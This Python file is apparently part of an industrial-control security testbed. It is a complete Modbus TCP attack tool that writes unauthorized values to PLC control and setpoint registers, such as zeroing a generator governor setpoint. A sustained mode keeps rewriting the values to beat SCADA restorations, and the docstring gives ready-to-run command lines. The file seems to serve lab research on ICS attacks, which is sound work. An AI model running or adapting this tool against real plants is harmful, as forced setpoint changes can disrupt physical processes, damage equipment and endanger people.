#!/usr/bin/env python3
"""
ASCEND-PG attacks/cmd_inject_register.py

Modbus TCP Command Injection — Control / Setpoint Register Modification.
MITRE ATT&CK for ICS: T0855 (Unauthorized Command Message).
Taxonomy Reference: Morris & Gao (2013) Command Injection.

DISTINCTION FROM FALSE DATA INJECTION (FDI / T0836):
  - False Data Injection (FDI) targets MEASUREMENT registers (typically lower addresses,
    e.g., 0..20) representing analog telemetry (voltage, frequency, active/reactive power).
    FDI aims to deceive state estimators and operators without directly altering local control logic.
  - Register Command Injection (T0855) targets CONTROL / SETPOINT registers (typically
    higher addresses, e.g., 50+), such as automatic voltage regulator (AVR) setpoints,
    generator governor throttle limits, over-frequency trip thresholds, and PID target gains.
    Writing to control registers directly destabilizes the physical process by altering the PLC's
    local automated control parameters (e.g., zeroing out a setpoint to force shutdown or throttle saturation).

This script performs unauthorized register writes against target PLCs:
  - FC06 (Write Single Register, 0x06): Writes a single control setpoint (when count == 1).
  - FC16 (Write Multiple Registers, 0x10): Writes a contiguous block of setpoint registers (when count > 1).

Supports single-shot writes as well as sustained injection loops to maintain the malicious
setpoint against supervisory SCADA overrides.

Usage:
    # Single register write (FC06) — zero out governor setpoint at register 50:
    python3 attacks/cmd_inject_register.py --target 10.0.0.1 --address 50 --value 0

    # Multiple register write (FC16) — zero out 5 consecutive setpoints (50-54):
    python3 attacks/cmd_inject_register.py --target 10.0.0.1 --address 50 --value 0 --count 5

    # Sustained injection — force critical setpoint to 0 for 10 seconds:
    python3 attacks/cmd_inject_register.py --target 10.0.0.1 --address 50 --value 0 --sustained --duration 10.0 --interval 0.5

Run this ON THE ATTACKER HOST inside the Mininet topology, e.g.:
    mininet> attacker python3 attacks/cmd_inject_register.py --target 10.0.0.1 --address 50 --value 0
"""

import argparse
import json
import logging
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

MODBUS_PORT = 502

# Shared event log store — repo data/ dir, anchored to this file (attacks/ -> repo root)
DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
log = logging.getLogger("cmd_inject_register")


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (list of dicts)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            events = []
    events.append(event)
    try:
        log_path.parent.mkdir(parents=True, exist_ok=True)
        log_path.write_text(json.dumps(events, indent=2), encoding="utf-8")
    except OSError as exc:
        log.error("Failed to write to log store %s: %s", log_path, exc)


def inject_registers_single(ip: str, port: int, address: int, value: int,
                            count: int = 1, device_id: int = 1,
                            log_path: Path = DEFAULT_LOG) -> bool:
    """
    One-shot register command injection.
    Uses FC06 (write_register) if count == 1, or FC16 (write_registers) if count > 1.
    """
    fc = 6 if count == 1 else 16
    log.info("Connecting to %s:%d to inject control register command (FC%02d, addr=%d, value=%d, count=%d)",
             ip, port, fc, address, value, count)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "register_cmd_inject",
        "status": "started",
        "target": ip,
        "port": port,
        "address": address,
        "value": value,
        "count": count,
        "fc": fc,
        "device_id": device_id,
    })

    client = ModbusTcpClient(ip, port=port, timeout=3)
    if not client.connect():
        log.error("Could not connect to target PLC at %s:%d", ip, port)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "register_cmd_inject",
            "status": "connection_failed",
            "target": ip,
            "port": port,
            "address": address,
            "error": f"Connection refused or timed out to {ip}:{port}",
        })
        return False

    try:
        if count == 1:
            result = client.write_register(address=address, value=value, device_id=device_id)
        else:
            values = [value] * count
            result = client.write_registers(address=address, values=values, device_id=device_id)

        if result.isError():
            log.error("Register command injection failed on %s:%d (FC%02d, addr=%d): %s",
                      ip, port, fc, address, result)
            log_event(log_path, {
                "stage": "Impair Process Control",
                "technique": "T0855",
                "action": "register_cmd_inject",
                "status": "error",
                "target": ip,
                "port": port,
                "address": address,
                "value": value,
                "count": count,
                "fc": fc,
                "error": str(result),
            })
            return False

        log.info("REGISTER COMMAND INJECTION SUCCESS: wrote value=%d to %d register(s) starting at addr=%d on %s:%d (FC%02d)",
                 value, count, address, ip, port, fc)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "register_cmd_inject",
            "status": "success",
            "target": ip,
            "port": port,
            "address": address,
            "value": value,
            "count": count,
            "fc": fc,
            "device_id": device_id,
        })
        return True
    except Exception as exc:
        log.error("Exception during register command injection on %s:%d: %s", ip, port, exc)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "register_cmd_inject",
            "status": "exception",
            "target": ip,
            "port": port,
            "address": address,
            "error": str(exc),
        })
        return False
    finally:
        client.close()


def inject_registers_sustained(ip: str, port: int, address: int, value: int,
                              count: int = 1, interval: float = 1.0,
                              duration: float = 10.0, device_id: int = 1,
                              log_path: Path = DEFAULT_LOG) -> dict:
    """
    Sustained register command injection: repeatedly writes control setpoints
    at specified intervals for `duration` seconds to overpower PLC automatic feedback
    or SCADA master setpoint restorations.
    """
    fc = 6 if count == 1 else 16
    log.info("Starting sustained register injection on %s:%d (addr=%d, val=%d, count=%d, interval=%.1fs, duration=%.1fs)",
             ip, port, address, value, count, interval, duration)

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "register_cmd_inject_sustained_start",
        "target": ip,
        "port": port,
        "address": address,
        "value": value,
        "count": count,
        "fc": fc,
        "interval": interval,
        "duration": duration,
        "device_id": device_id,
    })

    client = ModbusTcpClient(ip, port=port, timeout=3)
    if not client.connect():
        log.error("Could not connect to target PLC at %s:%d", ip, port)
        log_event(log_path, {
            "stage": "Impair Process Control",
            "technique": "T0855",
            "action": "register_cmd_inject_sustained_error",
            "target": ip,
            "error": f"Connection failed to {ip}:{port}",
        })
        return {"writes_sent": 0, "writes_failed": 0, "success": False}

    end_time = time.time() + duration
    writes_sent = 0
    writes_failed = 0

    try:
        while time.time() < end_time:
            if count == 1:
                result = client.write_register(address=address, value=value, device_id=device_id)
            else:
                values = [value] * count
                result = client.write_registers(address=address, values=values, device_id=device_id)

            if result.isError():
                writes_failed += 1
                log.warning("Mid-attack register write failed (%s:%d, addr=%d): %s", ip, port, address, result)
            else:
                writes_sent += 1
                log.info("Sustained register write #%d: addr=%d val=%d (FC%02d) on %s:%d",
                         writes_sent, address, value, fc, ip, port)

            time.sleep(interval)
    finally:
        client.close()

    total_success = (writes_sent > 0 and writes_failed == 0)
    log.info("Sustained register injection finished: %d succeeded, %d failed over %.1f seconds",
             writes_sent, writes_failed, duration)

    result_summary = {
        "writes_sent": writes_sent,
        "writes_failed": writes_failed,
        "duration": duration,
        "interval": interval,
        "target": ip,
        "address": address,
        "value": value,
        "count": count,
        "success": total_success,
    }

    log_event(log_path, {
        "stage": "Impair Process Control",
        "technique": "T0855",
        "action": "register_cmd_inject_sustained_result",
        "target": ip,
        "result": result_summary,
    })

    return result_summary


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Modbus Register Command Injection (MITRE ICS T0855)"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP address (e.g., 10.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=MODBUS_PORT,
                        help=f"Modbus TCP port (default: {MODBUS_PORT})")
    parser.add_argument("-a", "--address", type=int, default=50,
                        help="Holding/control register address to write (default: 50, distinguishing control setpoints from 0-indexed measurements)")
    parser.add_argument("-v", "--value", type=int, default=0,
                        help="Control setpoint value to inject (default: 0 to zero out setpoints)")
    parser.add_argument("-c", "--count", type=int, default=1,
                        help="Number of contiguous registers to write (1 uses FC06, >1 uses FC16; default: 1)")
    parser.add_argument("--sustained", action="store_true",
                        help="Repeat injection repeatedly over duration")
    parser.add_argument("--duration", type=float, default=10.0,
                        help="Total duration in seconds for sustained injection (default: 10.0)")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Interval in seconds between writes when sustained (default: 1.0)")
    parser.add_argument("--unit", type=int, default=1,
                        help="Modbus Unit ID / Device ID (default: 1)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help=f"Path to shared JSON log store (default: {DEFAULT_LOG})")

    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    if args.sustained:
        inject_registers_sustained(
            ip=args.target,
            port=args.port,
            address=args.address,
            value=args.value,
            count=args.count,
            interval=args.interval,
            duration=args.duration,
            device_id=args.unit,
            log_path=log_path,
        )
    else:
        inject_registers_single(
            ip=args.target,
            port=args.port,
            address=args.address,
            value=args.value,
            count=args.count,
            device_id=args.unit,
            log_path=log_path,
        )


if __name__ == "__main__":
    main()
